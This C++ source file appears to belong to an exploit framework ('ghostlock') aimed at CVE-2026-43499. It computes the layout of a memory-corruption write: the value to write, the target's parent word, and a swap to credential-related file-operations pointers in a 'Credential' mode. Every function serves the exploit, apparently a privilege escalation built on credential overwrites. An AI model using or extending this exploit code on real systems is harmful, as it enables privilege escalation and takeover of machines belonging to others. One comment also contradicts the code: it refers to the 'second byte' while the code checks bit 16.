/** @file memory/write_layout.cpp
 *  Choosing the value, the parent word and the object a write points at.
 */
#include "backend/cve_2026_43499/memory/write_layout.hpp"

namespace ghostlock::backend::cve_2026_43499::memory {
    WriteLayout write_layout(const WriteRequest &request, const LayoutInputs &inputs) noexcept {
        WriteLayout layout{};
        layout.fops = inputs.default_fops;
        if (request.mode == WriteMode::Disabled || request.target == 0U) {
            return layout;
        }
        if (request.preserve_child) {

            layout.value = request.mode == WriteMode::Credential ? inputs.credential_value
                                                                 : inputs.page_value;
        }
        if (request.mode == WriteMode::Credential) {
            layout.fops = inputs.credential_fops;
            layout.needs_credential_copy = true;
        }
        const std::uintptr_t backstep = static_cast<std::uintptr_t>(inputs.pointer_bytes);
        layout.parent = request.target >= backstep ? request.target - backstep : 0U;
        return layout;
    }

    bool layout_matches_request(const WriteRequest &request, const WriteLayout &layout) noexcept {
        if (request.mode == WriteMode::Disabled) {
            return false;
        }
        return request.preserve_child ? layout.value != 0U : layout.value == 0U;
    }

    bool layout_accepts_page(const WriteRequest &request, const WriteLayout &layout) noexcept {
        if (!layout_matches_request(request, layout)) {
            return false;
        }
        /* A preserving zero write lands across a state field; if the second byte
         * of the value it carries is even, that field is cleared and every lookup
         * after it fails. The bit lives in the value, so it is checked here. */
        if (request.mode == WriteMode::Zero && request.preserve_child &&
            ((layout.value >> 16U) & 1U) == 0U) {
            return false;
        }
        return true;
    }
}  // namespace ghostlock::backend::cve_2026_43499::memory
